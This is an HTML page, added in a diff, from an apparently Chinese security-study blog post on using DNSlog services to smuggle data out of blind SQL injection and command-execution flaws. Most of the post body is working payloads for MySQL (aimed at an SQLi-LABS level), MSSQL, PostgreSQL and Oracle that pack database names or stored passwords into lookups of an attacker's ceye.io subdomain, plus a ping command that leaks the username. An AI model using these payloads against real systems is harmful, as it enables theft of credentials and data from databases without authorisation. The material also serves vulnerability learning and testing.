@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：www.anquanke.com/post/id/98096                https://bbs.pediy.com/thread-223881.htm ####DNSlog在Web攻击的利用在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过DNSlog把想获得的数据外带出来。 ####常用情况  SQL注入中的盲注无回显的命令执行无">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cws6">
+<meta property="og:url" content="https://cws6.github.io/user-5035860-1543717448/漏洞学习/Dnslog在SQL注入中的利用.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：www.anquanke.com/post/id/98096                https://bbs.pediy.com/thread-223881.htm ####DNSlog在Web攻击的利用在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过DNSlog把想获得的数据外带出来。 ####常用情况  SQL注入中的盲注无回显的命令执行无">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-bfbd8a53f7e11710.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-98cd223b915eba9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-91b10fdf200aa38d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-f9a8f9b8e4cdf05d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-7d2c6918badf1e80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-02T02:24:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cws6">
+<meta name="twitter:description" content="参考文献：www.anquanke.com/post/id/98096                https://bbs.pediy.com/thread-223881.htm ####DNSlog在Web攻击的利用在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过DNSlog把想获得的数据外带出来。 ####常用情况  SQL注入中的盲注无回显的命令执行无">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-bfbd8a53f7e11710.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/user-5035860-1543717448/漏洞学习/Dnslog在SQL注入中的利用.html">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title> | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/Dnslog在SQL注入中的利用.html/">DNSLOG在SQL注入中的利用.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>参考文献：<a href="http://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">www.anquanke.com/post/id/98096</a><br>                <a href="https://bbs.pediy.com/thread-223881.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223881.htm</a></p>
+<p>####DNSlog在Web攻击的利用<br>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过<code>DNSlog</code>把想获得的数据外带出来。</p>
+<p>####常用情况</p>
+<blockquote>
+<p>SQL注入中的盲注<br>无回显的命令执行<br>无回显的SSRF</p>
+</blockquote>
+<p>####原理</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-bfbd8a53f7e11710.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"><br>攻击者提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，只要能获得DNS的日志，就得到了想要的值。</p>
+<ul>
+<li>推荐一个免费的dnslog平台：<a href="https://link.jianshu.com/?t=http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a><br>####1.命令执行<br><code>ping %USERNAME%.xxxxxx.ceye.io</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-98cd223b915eba9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></li>
+</ul>
+<p>####2.MySQL<br><strong>load_file</strong><br>在MySQL中有个<code>load_file()</code>函数可以用来读取本地的文件,<code>load_file()</code>函数还可以用来发送dns解析请求<br><em>以SQLi-LABS 第五关为例：</em><br><strong>payload：</strong><br><code>?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxxxx.ceye.io\\abc&#39;))),1,1)--+</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-91b10fdf200aa38d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br><strong>payload：</strong><br><code>?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;.xxxxxx.ceye.io\\abc&#39;))),1,1)--+</code><br> <img src="https://upload-images.jianshu.io/upload_images/5035860-f9a8f9b8e4cdf05d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+<p>concat()函数拼接了4个<code>\</code>了，因为转义的原因，<code>\\\\</code>就变成了<code>\\</code>，目的就是利用<code>UNC路径</code>。</p>
+<blockquote>
+<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。在Widnows中用共享文件的时候就会用到这种网络地址的形式<code>\\sss.xxx\test\</code></p>
+<ul>
+<li>Linux没有UNC路径这个东西，当MySQL处于Linux系统中的时候，不能使用这种方式外带数据的 </li>
+</ul>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-7d2c6918badf1e80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<p>####3.msSQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) </span><br><span class="line">FROM test.dbo.test_user where [USER] = &apos;admin&apos;)%2b&apos;.cece.nk40ci.ceye.io&apos;;</span><br><span class="line">EXEC(&apos;master..xp_dirtree &quot;\&apos;%2b@host%2b&apos;\foobar$&quot;&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>####4.postgreSQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN SELECT INTO query_result (select encode(pass::bytea,&apos;hex&apos;) from test_user where id =1);</span><br><span class="line">exec_cmd := E&apos;COPY table_output(content) FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\&apos;&apos;;</span><br><span class="line">   EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$$ LANGUAGE plpgSQL SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure></p>
+<p>####5.SQL Server<br>存储程序<code>master..xp_dirtree()</code>用于获取所有文件夹的列表和给定文件夹内部的子文件夹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">注册一个名为@host的变量，类型为varchar。</span><br><span class="line">SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;</span><br><span class="line">获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。</span><br><span class="line">EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);</span><br><span class="line">列远程主机的foobar$目录,由于是远程主机，所以会做一个dns解析，这样我们的dns平台就能得到日志了</span><br><span class="line">http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--</span><br></pre></td></tr></table></figure></p>
+<p>####6.Oracle<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UTL_HTTP.REQUEST</span><br><span class="line">select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||&apos;.xxxxxx.ceye.io&apos;) FROM sys.DUAL;</span><br><span class="line">DBMS_LDAP.INIT</span><br><span class="line">select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||&apos;.xxxxxx.ceye.io&apos;,80) FROM sys.DUAL;</span><br><span class="line">HTTPURITYPE</span><br><span class="line">select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||&apos;.xx.xxxxxx.ceye.io&apos;).GETCLOB() FROM sys.DUAL;</span><br><span class="line">UTL_INADDR.GET_HOST_ADDRESS</span><br><span class="line">select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||&apos;.ddd.xxxxxx.ceye.io&apos;) FROM sys.DUAL;</span><br></pre></td></tr></table></figure></p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/Dnslog在SQL注入中的利用.html/">DNSLOG在SQL注入中的利用.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
